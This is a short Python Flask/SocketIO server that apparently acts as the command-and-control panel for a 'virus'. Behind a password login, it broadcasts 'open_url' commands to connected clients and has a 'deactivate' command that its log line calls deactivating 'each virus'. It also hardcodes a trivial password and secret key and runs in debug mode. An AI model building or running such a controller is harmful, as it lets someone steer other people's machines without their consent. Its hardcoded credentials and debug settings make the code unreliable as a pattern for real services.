from flask import Flask, render_template, session, request
from flask import url_for, redirect, flash
from flask_socketio import SocketIO, emit

PASSWORD = 'asd'

class Conf:
    SECRET_KEY = "you lox1"
    #SESSION_COOKIE_SECURE = True
    DEBUG = True


app = Flask(__name__)
app.config.from_object(Conf)
sio = SocketIO(app)

@app.route('/', methods=["GET", "POST"])
def index():
    if request.method == "POST":
        password = request.form['password']
        if password == PASSWORD:
            print('-'*80)
            session['is_passed'] = True
            print(session['is_passed'])
            return redirect(url_for('get_control_panel'))
        flash('Password is incorrect')

    return render_template('index.html')

@app.route('/control-panel/')
def get_control_panel():
    print('0'*80)
    if 'is_passed' in session:
        print('1'*80)
        if session['is_passed'] == True:
            return render_template('control_panel.html')
    return redirect(url_for('index'))

@sio.on('message')
def handle_message(url):
    print(f'url : {url}')
    emit('open_url',{'url':url}, broadcast=True)

@sio.on('deactivate')
def deactivate():
    print('Deactivaing each virus')
    emit('deactivate',broadcast=True)

@sio.on('disconnect')
def disconnect():
    print('Disconnected')


if __name__ == "__main__":
    sio.run(app, debug=True)
